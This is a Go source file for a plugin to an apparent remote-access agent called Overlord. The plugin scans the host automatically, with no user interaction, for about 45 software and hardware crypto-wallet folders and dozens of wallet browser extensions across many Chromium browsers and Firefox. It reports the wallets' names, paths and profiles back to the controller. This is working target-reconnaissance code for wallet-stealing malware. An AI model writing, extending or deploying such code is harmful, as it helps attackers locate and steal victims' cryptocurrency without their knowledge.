package main

import (
	"encoding/json"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

// HostInfo contains metadata about the remote client sent by the Overlord agent.
type HostInfo struct {
	ClientID string `json:"clientId"`
	OS       string `json:"os"`
	Arch     string `json:"arch"`
	Version  string `json:"version"`
}

// WalletResult represents a single detected wallet or wallet-related artifact.
type WalletResult struct {
	Name     string `json:"name"`
	Category string `json:"category"` // "browser_extension" | "software" | "hardware"
	Path     string `json:"path"`
	Browser  string `json:"browser,omitempty"`
	Profile  string `json:"profile,omitempty"`
}

// ScanResult is the payload sent back on the "scan_result" event.
type ScanResult struct {
	Wallets   []WalletResult `json:"wallets"`
	Arch      string         `json:"arch"`
	ScannedAt string         `json:"scannedAt"`
	Total     int            `json:"total"`
}

var (
	hostInfo HostInfo
	sendFn   func(event string, payload []byte)
	mu       sync.Mutex
)

func setSend(fn func(event string, payload []byte)) {
	mu.Lock()
	sendFn = fn
	mu.Unlock()
}

func sendEvent(event string, payload interface{}) {
	mu.Lock()
	fn := sendFn
	mu.Unlock()
	if fn == nil {
		return
	}
	data, err := json.Marshal(payload)
	if err != nil {
		log.Printf("[crypto-wallet] marshal error: %v", err)
		return
	}
	fn(event, data)
}

// handleInit runs on plugin load — sends ready and auto-starts a scan.
func handleInit(hostJSON []byte) error {
	if err := json.Unmarshal(hostJSON, &hostInfo); err != nil {
		return err
	}
	log.Printf("[crypto-wallet] init clientId=%s os=%s arch=%s", hostInfo.ClientID, hostInfo.OS, hostInfo.Arch)
	sendEvent("ready", map[string]string{"message": "crypto-wallet plugin ready"})
	// Auto-scan on every client load — no UI interaction needed.
	go func() {
		result := performScan()
		sendEvent("scan_result", result)
	}()
	return nil
}

// handleEvent responds to events dispatched from the plugin UI.
func handleEvent(event string, payload []byte) error {
	switch event {
	case "scan":
		go func() {
			result := performScan()
			sendEvent("scan_result", result)
		}()
	default:
		log.Printf("[crypto-wallet] unhandled event: %s", event)
	}
	return nil
}

func handleUnload() {
	log.Printf("[crypto-wallet] unloading")
}

// ─── Path helpers ────────────────────────────────────────────────────────────

func pathExists(p string) bool {
	_, err := os.Stat(p)
	return !os.IsNotExist(err)
}

type envPaths struct {
	appdata      string
	localappdata string
	userprofile  string
}

func resolveEnvPaths() envPaths {
	home, _ := os.UserHomeDir()
	appdata := os.Getenv("APPDATA")
	localappdata := os.Getenv("LOCALAPPDATA")
	userprofile := os.Getenv("USERPROFILE")
	if appdata == "" {
		appdata = filepath.Join(home, "AppData", "Roaming")
	}
	if localappdata == "" {
		localappdata = filepath.Join(home, "AppData", "Local")
	}
	if userprofile == "" {
		userprofile = home
	}
	return envPaths{appdata, localappdata, userprofile}
}

func expandPath(p string, env envPaths) string {
	p = strings.ReplaceAll(p, "%APPDATA%", env.appdata)
	p = strings.ReplaceAll(p, "%LOCALAPPDATA%", env.localappdata)
	p = strings.ReplaceAll(p, "%USERPROFILE%", env.userprofile)
	return p
}

// ─── Software & Hardware Wallet Definitions ───────────────────────────────────

type softwareDef struct {
	Name     string
	Category string // "software" or "hardware"
	Path     string // may contain %APPDATA%, %LOCALAPPDATA%, %USERPROFILE%
}

var softwareWallets = []softwareDef{
	// ── Software Wallets ─────────────────────────────────────────────────────
	{"Exodus", "software", `%APPDATA%\Exodus`},
	{"Trust Wallet", "software", `%APPDATA%\Trust Wallet`},
	{"Atomic Wallet", "software", `%APPDATA%\atomic`},
	{"Electrum", "software", `%APPDATA%\Electrum`},
	{"Bitcoin Core", "software", `%APPDATA%\Bitcoin`},
	{"Ethereum / Geth", "software", `%APPDATA%\Ethereum`},
	{"Monero GUI", "software", `%APPDATA%\bitmonero`},
	{"Wasabi Wallet", "software", `%APPDATA%\WalletWasabi`},
	{"Sparrow Wallet", "software", `%APPDATA%\Sparrow`},
	{"Dogecoin Core", "software", `%APPDATA%\DogeCoin`},
	{"Litecoin Core", "software", `%APPDATA%\Litecoin`},
	{"Dash Core", "software", `%APPDATA%\DashCore`},
	{"Zcash", "software", `%APPDATA%\Zcash`},
	{"Jaxx Liberty", "software", `%APPDATA%\com.liberty.jaxx`},
	{"Coinomi", "software", `%APPDATA%\Coinomi\Coinomi`},
	{"Guarda", "software", `%APPDATA%\Guarda`},
	{"MyCrypto", "software", `%APPDATA%\MyCrypto`},
	{"Neon Wallet (NEO)", "software", `%APPDATA%\NEON`},
	{"BitPay", "software", `%APPDATA%\BitPay`},
	{"Armory", "software", `%APPDATA%\Armory`},
	{"Daedalus (Cardano)", "software", `%APPDATA%\Daedalus Mainnet`},
	{"Bisq", "software", `%APPDATA%\Bisq`},
	{"Frame", "software", `%APPDATA%\frame`},
	{"Stacks Wallet", "software", `%APPDATA%\Stacks Wallet`},
	{"Solar Wallet", "software", `%APPDATA%\Solar`},
	{"Phantom Desktop", "software", `%APPDATA%\Phantom`},
	{"MyEtherWallet Desktop", "software", `%APPDATA%\MyEtherWallet`},
	{"OneKey Desktop", "software", `%APPDATA%\OneKey`},
	{"Lace (Cardano)", "software", `%APPDATA%\Lace`},
	{"MultiBit", "software", `%APPDATA%\MultiBit`},
	{"Copay", "software", `%APPDATA%\Copay`},
	{"Specter Desktop", "software", `%USERPROFILE%\.specter`},
	{"Yoroi Desktop", "software", `%APPDATA%\Yoroi`},
	{"Blockstream Green", "software", `%APPDATA%\Blockstream\Green`},
	{"Unstoppable Wallet", "software", `%APPDATA%\Unstoppable`},
	// ── Hardware Wallet Software ─────────────────────────────────────────────
	{"Ledger Live", "hardware", `%APPDATA%\Ledger Live`},
	{"Ledger Live (installed)", "hardware", `%LOCALAPPDATA%\Programs\ledger-live-desktop`},
	{"Trezor Suite (installed)", "hardware", `%LOCALAPPDATA%\Programs\trezor-suite`},
	{"Trezor Bridge", "hardware", `%APPDATA%\Trezor`},
	{"BitBox App", "hardware", `%APPDATA%\BitBoxApp`},
	{"KeepKey / ShapeShift", "hardware", `%APPDATA%\ShapeShift`},
	{"Foundation Envoy", "hardware", `%APPDATA%\Envoy`},
	{"Keystone Suite", "hardware", `%APPDATA%\Keystone`},
	{"GridPlus Lattice Manager", "hardware", `%APPDATA%\GridPlus`},
	{"OneKey HW Suite", "hardware", `%LOCALAPPDATA%\Programs\onekey-desktop`},
	{"CoolWallet", "hardware", `%APPDATA%\CoolWallet`},
}

// ─── Browser Extension Wallet Definitions ─────────────────────────────────────

type extensionDef struct {
	Name      string
	ChromeID  string // Chrome/Brave/Edge extension ID
	FirefoxID string // Firefox add-on ID found in extensions.json
}

var extensionWallets = []extensionDef{
	// Major multi-chain
	{"MetaMask", "nkbihfbeogaeaoehlefnkodbefgpgknn", "webextension@metamask.io"},
	{"MetaMask Flask (dev)", "ljfoeinjpaedjfecbmggjgodbgkmjkjk", ""},
	{"MetaMask Institutional", "hjgfjnbaiipbpjnmhfpjkgjgibiokiop", ""},
	{"Coinbase Wallet", "hnfanknocfeofbddgcijnmhnfnkdnaad", ""},
	{"Trust Wallet Extension", "egjidjbpglichdcondbcbdnbeeppgdph", ""},
	{"OKX Wallet", "mcohilncbfahbmgdjkbpemcciiolgcge", ""},
	{"Binance Chain Wallet", "fhbohimaelbohpjbbldcngcnapndodjp", ""},
	{"Bitget Wallet (BitKeep)", "jiidiaalihmmhdlpblelh78zjlbdlhif", ""},
	{"Math Wallet", "afbcbjpbpfadlkmhmclhkeeodmamcflc", ""},
	{"ONTO Wallet", "ifckdpamphokdglkkdomedpdegcjhjdp", ""},
	{"TokenPocket", "mfgccjchihfkkindfppnaooecgfneiii", ""},
	{"imToken", "klnaejjgbibmhlephnhpmaofohgkpgkd", ""},
	{"SafePal Extension", "lgmpcpglpngdoalbgeoldeajfclnhafa", ""},
	{"OneKey Extension", "jnmbobjmhlngoefaiojfljckilhhlknb", ""},
	{"Enkrypt (MEW)", "kkpllkodjeloidieedojogacfhpaihoh", ""},
	{"Exodus Web3 Wallet", "aholpfdialjgjfhomihkjbmgjidlcdno", ""},
	// Ethereum ecosystem
	{"Rabby Wallet", "acmacodkjbdgmoleebolmdjonilkdbch", ""},
	{"Zerion", "klghhnkfiboaemgnmopkndemckdcmegp", ""},
	{"1inch Wallet", "ookjlbkiijinhpmnjffcofjonbfbgaoc", ""},
	{"Taho (ex-Tally Ho)", "eajafomhmkipbjmfmhebemolkcicgfmd", ""},
	{"Frame Companion", "ldcoohedfbjoobcadoglnnmmfbdlmmhf", ""},
	{"Rainbow", "opfgelmcmbiajamepnmloijbpoleiama", ""},
	{"XDEFI Wallet", "hmeobnfnfcmdkdcmlblgagmfpfboieaf", ""},
	{"Liquality Wallet", "kpfopkelmapcoipemfendmdcghnegimn", ""},
	{"Rivet", "mobfgbebbmfbkgclekkpolpagjckkoom", ""},
	{"Nifty Wallet", "jbdaocneiiinmjbjlgalhcelgbejmnid", ""},
	// Solana
	{"Phantom", "bfnaelmomeimhlpmgjnjophhpkkoljpa", ""},
	{"Solflare", "bhhhlbepdkbapadjdnnojkbgioiodbic", ""},
	{"Glow (Solana)", "ojbcfhjmpigfobfclfflafhblgemeidi", ""},
	{"Slope Wallet", "pocmplpaccanhmnllbbkpgfliimjljgo", ""},
	{"Backpack", "aflkmfhebedbjioipglgcbcmnbpgliof", ""},
	// Ronin / Gaming
	{"Ronin Wallet", "fnjhmkhhmkbjkkabndcnnogagogbneec", ""},
	// Cosmos / IBC
	{"Keplr (Cosmos)", "dmkamcknogkgcdfhhbddcghachkejeap", ""},
	{"Leap Cosmos Wallet", "fcfcfllfndlomdhbehjjcoimbgofdncg", ""},
	// NEAR
	{"Sender (NEAR)", "epapihdplajcdnnkdeiahlgigofloibg", ""},
	// TRON
	{"TronLink", "ibnejdfjmmkpcnlpebklmnkoeoihofec", ""},
	// Aptos / Sui
	{"Petra (Aptos)", "ejjladinnckdgjemekebdpeokbikhfci", ""},
	{"Martian Wallet (Aptos)", "efbglgofoippbgcjepnhiblaibcnclgk", ""},
	{"Fewcha (Aptos)", "ebcnkffafmkfbndbbdednhcamobkijia", ""},
	{"Pontem (Aptos)", "phkbamefinggmakgklpkljjmgibohnba", ""},
	{"Sui Wallet", "opcgpfmipidbgpenhmajoajpbobppdil", ""},
	// Cardano
	{"Yoroi (Cardano)", "ffnbelfdoeiohenkjibnmadjiehjhajb", ""},
	{"Nami (Cardano)", "lpfcbjknijpeeillifnkikgncikgfhdo", ""},
	{"Eternl / ccvault (Cardano)", "kmhcihpebfmpgmihbkipmjlmmioameka", ""},
	{"Flint (Cardano)", "hnhobjmcibchnmglfbldbfabcgaknlkj", ""},
	{"Typhon (Cardano)", "kfdniefadaanbjodldohaedphafoffoh", ""},
	{"Gero Wallet (Cardano)", "iifeegfcfhlhhnilhfoeihllenamcfgc", ""},
	// Terra / Cosmos
	{"Station (Terra/Cosmos)", "aiifbnbfobpmeekipheeijimdpnlpgpp", ""},
	// Stacks / Bitcoin L2
	{"Leather / Hiro (Stacks)", "ldinpeekobnhjjdofggfgjlcehhmanlj", ""},
	// Polkadot / Substrate
	{"Talisman (Polkadot)", "fijngjgcjhjmmpcmkeiomlglpeiijkld", ""},
	{"SubWallet (Polkadot)", "onhogfjeacnfoofkfgppdlbmlmnplgbn", ""},
	{"Polkadot.js Extension", "mopnmbcafieddcagagdcbnhejhlodfdd", ""},
	{"Nova Wallet (Polkadot)", "ghookoebkcboocaejnbbfnelbgghkfmk", ""},
	// Other
	{"Coin98", "aeachknmefphepccionboohckonoeemg", ""},
	{"Venom Wallet", "ojggmchlghnjlapmfbnjholfjkiidbch", ""},
	{"Clover Wallet", "nhnkbkgjikgcigadomkphalanndcapjk", ""},
}

// ─── Chromium Browser Definitions ────────────────────────────────────────────

type chromiumBrowserDef struct {
	Name     string
	UserData string // path using env var placeholders
}

var chromiumBrowsers = []chromiumBrowserDef{
	{"Google Chrome", `%LOCALAPPDATA%\Google\Chrome\User Data`},
	{"Brave", `%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data`},
	{"Microsoft Edge", `%LOCALAPPDATA%\Microsoft\Edge\User Data`},
	{"Opera GX", `%APPDATA%\Opera Software\Opera GX Stable`},
	{"Opera", `%APPDATA%\Opera Software\Opera Stable`},
	{"Vivaldi", `%LOCALAPPDATA%\Vivaldi\User Data`},
	{"Chromium", `%LOCALAPPDATA%\Chromium\User Data`},
	{"Yandex Browser", `%LOCALAPPDATA%\Yandex\YandexBrowser\User Data`},
	{"Epic Privacy Browser", `%LOCALAPPDATA%\Epic Privacy Browser\User Data`},
	{"Comodo Dragon", `%LOCALAPPDATA%\Comodo\Dragon\User Data`},
	{"Torch Browser", `%LOCALAPPDATA%\Torch\User Data`},
	{"Cent Browser", `%LOCALAPPDATA%\CentBrowser\User Data`},
	{"Chedot Browser", `%LOCALAPPDATA%\Chedot\User Data`},
	{"Slimjet", `%LOCALAPPDATA%\Slimjet\User Data`},
	{"uCozMedia Uran", `%LOCALAPPDATA%\uCozMedia\Uran\User Data`},
	{"Orbitum", `%LOCALAPPDATA%\Orbitum\User Data`},
	{"Amigo", `%LOCALAPPDATA%\Amigo\User Data`},
	{"Sputnik", `%LOCALAPPDATA%\Sputnik\Sputnik\User Data`},
}

// ─── Scan Logic ───────────────────────────────────────────────────────────────

// getChromiumProfiles returns all profile subdirectory names found in a User Data dir.
func getChromiumProfiles(userDataDir string) []string {
	var profiles []string
	if pathExists(filepath.Join(userDataDir, "Default")) {
		profiles = append(profiles, "Default")
	}
	for i := 1; i <= 30; i++ {
		name := fmt.Sprintf("Profile %d", i)
		if pathExists(filepath.Join(userDataDir, name)) {
			profiles = append(profiles, name)
		}
	}
	return profiles
}

// scanChromiumBrowser scans all profiles of a single Chromium-based browser.
func scanChromiumBrowser(browserName, userDataDir string) []WalletResult {
	var results []WalletResult
	profiles := getChromiumProfiles(userDataDir)
	seen := make(map[string]bool)

	for _, profile := range profiles {
		for _, ext := range extensionWallets {
			if ext.ChromeID == "" {
				continue
			}
			// Check LevelDB extension storage (most reliable — exists even if code dir is absent)
			p1 := filepath.Join(userDataDir, profile, "Local Extension Settings", ext.ChromeID)
			// Also check installed extension code directory
			p2 := filepath.Join(userDataDir, profile, "Extensions", ext.ChromeID)

			var found string
			if pathExists(p1) {
				found = p1
			} else if pathExists(p2) {
				found = p2
			}
			if found == "" {
				continue
			}
			// Only report each wallet once per browser (first profile found)
			key := browserName + "|" + ext.Name
			if seen[key] {
				continue
			}
			seen[key] = true
			results = append(results, WalletResult{
				Name:     ext.Name,
				Category: "browser_extension",
				Path:     found,
				Browser:  browserName,
				Profile:  profile,
			})
		}
	}
	return results
}

// scanFirefox checks each Firefox profile's extensions.json for known add-on IDs.
func scanFirefox(env envPaths) []WalletResult {
	var results []WalletResult
	profilesDir := filepath.Join(env.appdata, "Mozilla", "Firefox", "Profiles")
	entries, err := os.ReadDir(profilesDir)
	if err != nil {
		return results
	}

	for _, entry := range entries {
		if !entry.IsDir() {
			continue
		}
		profilePath := filepath.Join(profilesDir, entry.Name())

		// Primary method: search extensions.json for known add-on IDs
		extJSON := filepath.Join(profilePath, "extensions.json")
		data, err := os.ReadFile(extJSON)
		if err == nil {
			content := string(data)
			for _, ext := range extensionWallets {
				if ext.FirefoxID == "" {
					continue
				}
				if strings.Contains(content, ext.FirefoxID) {
					results = append(results, WalletResult{
						Name:     ext.Name,
						Category: "browser_extension",
						Path:     extJSON,
						Browser:  "Firefox",
						Profile:  entry.Name(),
					})
				}
			}
		}

		// Secondary method: scan extensions/ directory by name prefix
		extDir := filepath.Join(profilePath, "extensions")
		extEntries, err := os.ReadDir(extDir)
		if err != nil {
			continue
		}
		for _, ee := range extEntries {
			eName := ee.Name()
			for _, ext := range extensionWallets {
				if ext.FirefoxID == "" {
					continue
				}
				prefix := strings.Split(ext.FirefoxID, "@")[0]
				if !strings.Contains(eName, prefix) {
					continue
				}
				// Avoid double-counting if already found via extensions.json
				alreadyFound := false
				for _, r := range results {
					if r.Browser == "Firefox" && r.Name == ext.Name && r.Profile == entry.Name() {
						alreadyFound = true
						break
					}
				}
				if !alreadyFound {
					results = append(results, WalletResult{
						Name:     ext.Name,
						Category: "browser_extension",
						Path:     filepath.Join(extDir, eName),
						Browser:  "Firefox",
						Profile:  entry.Name(),
					})
				}
			}
		}
	}
	return results
}

// performScan runs the full wallet detection and returns a ScanResult.
func performScan() ScanResult {
	env := resolveEnvPaths()
	var wallets []WalletResult

	// 1. Software & hardware wallets
	for _, def := range softwareWallets {
		expanded := expandPath(def.Path, env)
		if pathExists(expanded) {
			wallets = append(wallets, WalletResult{
				Name:     def.Name,
				Category: def.Category,
				Path:     expanded,
			})
		}
	}

	// 2. Chromium-based browser extensions
	for _, browser := range chromiumBrowsers {
		userDataDir := expandPath(browser.UserData, env)
		if !pathExists(userDataDir) {
			continue
		}
		wallets = append(wallets, scanChromiumBrowser(browser.Name, userDataDir)...)
	}

	// 3. Firefox extensions
	wallets = append(wallets, scanFirefox(env)...)

	if wallets == nil {
		wallets = []WalletResult{}
	}

	return ScanResult{
		Wallets:   wallets,
		Arch:      hostInfo.Arch,
		ScannedAt: time.Now().UTC().Format(time.RFC3339),
		Total:     len(wallets),
	}
}
